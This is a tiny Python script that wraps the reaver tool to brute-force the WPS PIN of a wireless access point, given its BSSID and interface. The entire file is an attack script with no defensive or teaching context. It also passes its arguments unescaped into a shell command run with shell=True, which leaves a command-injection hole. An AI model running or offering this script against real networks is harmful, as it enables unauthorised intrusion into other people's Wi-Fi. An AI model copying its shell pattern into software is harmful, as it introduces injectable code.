import subprocess

def wps_pin_crack(bssid, iface="wlan0"):
    command = f"reaver -i {iface} -b {bssid} -vv"
    subprocess.run(command, shell=True)
